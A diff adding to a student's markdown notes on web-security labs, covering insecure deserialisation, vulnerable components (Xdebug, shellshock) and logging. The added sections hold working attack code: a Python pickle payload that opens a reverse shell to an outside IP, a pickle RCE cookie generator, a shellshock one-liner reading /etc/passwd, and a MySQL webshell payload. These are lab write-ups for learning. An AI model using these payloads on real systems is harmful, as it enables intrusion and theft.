@@ -95,6 +95,17 @@ this markdown file is to be used in conjunction with the slides and is supposed 
     - [week 7 lab: Article Setup – reflected XSS](#week-7-lab-article-setup--reflected-xss)
     - [week 7 lab: APHP Micro Blog – Persistent XSS, negative example of reflected XSS](#week-7-lab-aphp-micro-blog--persistent-xss-negative-example-of-reflected-xss)
     - [week7 lab: RCE Via MySQL](#week7-lab-rce-via-mysql)
+- [Day 8: Insecure Deserialisation, Using Compromised Components and Insufficient Logging & Monitoring](#day-8-insecure-deserialisation-using-compromised-components-and-insufficient-logging--monitoring)
+  - [insecure deserialisation](#insecure-deserialisation)
+    - [week 8 lab: Pickeld Deserialiser II -Change serialized cookie with different value](#week-8-lab-pickeld-deserialiser-ii--change-serialized-cookie-with-different-value)
+    - [week8 lab: Pickeld Deserialiser I - Change serialized object to reverse shell object](#week8-lab-pickeld-deserialiser-i---change-serialized-object-to-reverse-shell-object)
+  - [Using Vulnerable Components](#using-vulnerable-components)
+    - [week8 lab: Vulnerable Xdebug](#week8-lab-vulnerable-xdebug)
+    - [week 8 lab: Vulnerable to shellshock](#week-8-lab-vulnerable-to-shellshock)
+  - [Insufficient Logging](#insufficient-logging)
+    - [week 8 lab: Log Analysis for GoAccess](#week-8-lab-log-analysis-for-goaccess)
+    - [week 8 lab: Log Analysis for Apache](#week-8-lab-log-analysis-for-apache)
+    - [week8 lab: Privilege Escalation Web to Root](#week8-lab-privilege-escalation-web-to-root)
 - [less important labs to do soon:](#less-important-labs-to-do-soon)
 - [todos and toreads](#todos-and-toreads)
 - [uncategorised readings:](#uncategorised-readings)
@@ -1712,6 +1723,13 @@ similar to the previous lab, this time, we create a php script that will give us
 This is pretty generic of a description actually, anything whereby the config isn't done properly will fall under this. 
 Examples: WebDAV setup, controlling what HTTP request methods are permissible, sanitising input fields...
 
+[examples of security misconfiguration](https://hdivsecurity.com/owasp-security-misconfiguration)
+- directory listing refers to that default listing of subdirs when an index page doesn't exist!
+- when debugging info is openly available
+
+[A brief on webdav, its history and everything](https://www.cloudwards.net/what-is-webdav/#:~:text=WebDAV%20stands%20for%20Web%20Distributed,to%20collaborate%20on%20web%20content)
+- seems like it's what's under the hood when it comes to file hosting and stuff
+
 ### week7 lab: Missing Function-Level Access Control: Arbitrary Folder Deletion
 [350](https://youtu.be/IfrrvgvLYao)
 
@@ -1758,6 +1776,10 @@ will make the script run and send the attacker machine the url with the cookie a
 
 rule of thumb: activeJS supplied by the client side should never be rendered on the page itself without the server sanitising that JS. 
 
+ [XSS is a very deep area](https://excess-xss.com/) : 
+ - there are different types of XSS, e.g. persistent, reflected, dom-manipulation...
+
+
 ### week 7 lab: Article Setup – reflected XSS
 [cid=492](https://youtu.be/u2yRbFEd894)
 
@@ -1801,15 +1823,106 @@ We write a PHP webshell into it then, payload:
   select "<?php $output=shell_exec($_GET["cmd"]);echo "<pre>".output."/pre"?" into outfile "/var/www/html/shell.php" from mysql.user limit 1;"
   ```
 
-week 7 reading: 
-https://hdivsecurity.com/owasp-broken-access-control
-
-
-https://hdivsecurity.com/owasp-security-misconfiguration
 
 https://excess-xss.com/
 
 https://www.cloudwards.net/what-is-webdav/#:~:text=WebDAV%20stands%20for%20Web%20Distributed,to%20collaborate%20on%20web%20content.
+
+
+# Day 8: Insecure Deserialisation, Using Compromised Components and Insufficient Logging & Monitoring
+
+
+## [insecure deserialisation](https://thehackerish.com/insecure-deserialization-explained-with-examples/)
+- a deserialisation routine also refers to some kinda "manual", which is the lib e.g. "pickle" uses to work with the object note that serialisation is diff from encoding because encoding is flat and interrelations not kept... 
+  think of it as conversion into a stream of bytes while maintaining the interrelationships
+
+- this is pretty language specific actually. e.g. in the case of python, we have to exploit how picking is done (hence the `__reduce__` method being written that tells the deserialiser how to work with the object)
+- 
+
+[writeup on it](https://thehackerish.com/insecure-deserialization-explained-with-examples/)
+
+
+### week 8 lab: Pickeld Deserialiser II -Change serialized cookie with different value
+[cid 1915](https://youtu.be/O7q6MbfpAzo)
+
+We tried to see if deserialisation vulnerability exists by decoding the cookie, then modifying what looked like arguments, encoding it back to b64 and then sending a request to the website. Note that the encoding scheme for the cookie value was hinted at by the ending `=` character.
+
+Once confirmed, we wrote a python script that gives us a cookie that can do RCE: 
+
+  ```python
+  import pickle
+  import base64
+  import subprocess 
+
+  class User(object): 
+    def __reduce__(self): 
+      return(self.__class__, (subprocess.check_output(["whoami"])))
+    def __init__(self, name):
+      self.name = name
+  user = User("jim")
+  cookie = base64.b64encode(pickle.dumps(user))
+  print(cookie)
+  ```
+
+  the `__reduce__` method is called during pickling, it returns a tuple that shows how to reconstruct the class when unpickling, 
+  OR it returs a string that represents the name of a global variable.Basically tells the deserialiser how to work with the object.
+
+### week8 lab: Pickeld Deserialiser I - Change serialized object to reverse shell object
+[cid=1912](https://youtu.be/e3e3m5i5twE) 
+
+```python
+import pickle
+import base64
+import subprocess 
+import os
+
+class Shell(object): 
+  def __reduce__(self): 
+    return (os.system, ("python -c 'import socket, subprocess, os;s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"192.128.12.2\", 1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(), 2); p = subprocess.call([\"/bin/sh\",\"-i\"]);'&",))
+
+pickledData=pickle.dumps(Shell())
+print(base64.b64encode(pickledData))
+```
+
+this gives us a ***reverseshell!*** also note that the method here is `dumps` and not `dump`
+also, `socstream` in that payload means it's a tcp socket
+
+## Using Vulnerable Components
+
+### week8 lab: Vulnerable Xdebug
+[cid=1909](https://youtu.be/BTsNpCd1Xog) 
+
+The target webapp here has it's phpinfo available, where we can see what components/dependencies are used for the webapp. We see that [Xdebug is being used and the version of it has a metaspoloit exploit](https://www.exploit-db.com/exploits/44568). 
+
+We used [Searchsploit](https://hydrasky.com/network-security/searchsploit-a-command-line-search-tool-for-exploit-db/) to look thru exploitDB for a known exploit, after which we looked thru metasploit for an exploit, just ran that exploit and that opened [an instance of metapreter](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/) and we just used the webshell from there.
+
+### week 8 lab: Vulnerable to shellshock
+[1911](https://youtu.be/igr5i68lRzw)
+
+more of a bash system vulnerability that can be exploited thru a web interfaces based on how a request gets handled on the server side, more on [shellshock as explained by cloudfare](https://blog.cloudflare.com/inside-shellshock/) and the [CVE repo](https://github.com/opsxcq/exploit-CVE-2014-6271)
+
+Here, we notice upon inspecting the webpage that there's a CGI ([Common Gateway Interface](https://en.wikipedia.org/wiki/Common_Gateway_Interface))script, specifically, `gettime.cgi` that's running on that target, so some sort of CLI environment going on, we want to see if it's vulnerable to the shellshock exploit. 
+
+We use nmap's nse script to check if it's vulnerable to shellshock : `nmap --script http-shellshock --script-args “http-shellshock.uri=/gettime.cgi” <target ip>`. This confirms that shellshock vulnerability exists. 
+
+the payload example is found in the repo. e.g. `() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'`. [see slide 12 for explanation to that bash one-liner](https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf) Using Burp to intercept a request, Inject the payload into the user-agent argument of the HTTP header. The output willbe in the response. 
+
+## Insufficient Logging
+
+### week 8 lab: Log Analysis for GoAccess
+[cid=142](https://youtu.be/dw7GiUNOgY0)
+
+SKIPPED
+
+### week 8 lab: Log Analysis for Apache
+[cid=1181]()
+
+OOh there are flags for this.
+
+
+### week8 lab: Privilege Escalation Web to Root
+https://www.attackdefense.com/challengedetails?cid=85
+https://youtu.be/AeFzdX-vhW8
 
 
 
@@ -1856,6 +1969,7 @@ https://www.cloudwards.net/what-is-webdav/#:~:text=WebDAV%20stands%20for%20Web%2
 
 * [CRLF characters](https://tools.ietf.org/html/rfc2616)
 * [metasploit tutorial](https://www.youtube.com/watch?v=8lR27r8Y_ik)
+* [what meterpreter is](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/)
 * [case study of equifax leak: some apache struct caveat](https://www.brighttalk.com/webcast/13983/280311/behind-the-equifax-breach-a-deep-dive-into-apache-struts-cve-2017-5638)
 * [honeypots](https://www.forcepoint.com/cyber-edu/deception-technology)
 * [understanding rainbow tables for password cracking](https://www.geeksforgeeks.org/understanding-rainbow-table-attack/)
@@ -1863,6 +1977,7 @@ https://www.cloudwards.net/what-is-webdav/#:~:text=WebDAV%20stands%20for%20Web%2
 * [opaque actually makes things opaque](https://medium.com/@billatnapier/opaque-one-of-the-great-advancements-in-cybersecurity-aace51a76560)
 * look into learning GOlang for writing own scripts and crawlers
 * port(external pov) vs socket(as file descriptors?)
+* 
 
 
 
@@ -1886,6 +2001,9 @@ https://www.cloudwards.net/what-is-webdav/#:~:text=WebDAV%20stands%20for%20Web%2
 * [somewhat detailed description of owasp top10](https://www.troyhunt.com/owasp-top-10-for-net-developers-part-1/)
 * [hash analyser:](https://www.tunnelsup.com/hash-analyzer/) figure out what kind of hashing is being done. Here are some [example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
 * Portswigger is a damn good learning and news resource 
+* [XSS is a very deep area](https://excess-xss.com/)
+* [HackerOne has a free course available for everyone](https://www.hacker101.com/)
+
 
 
 # Questions: 
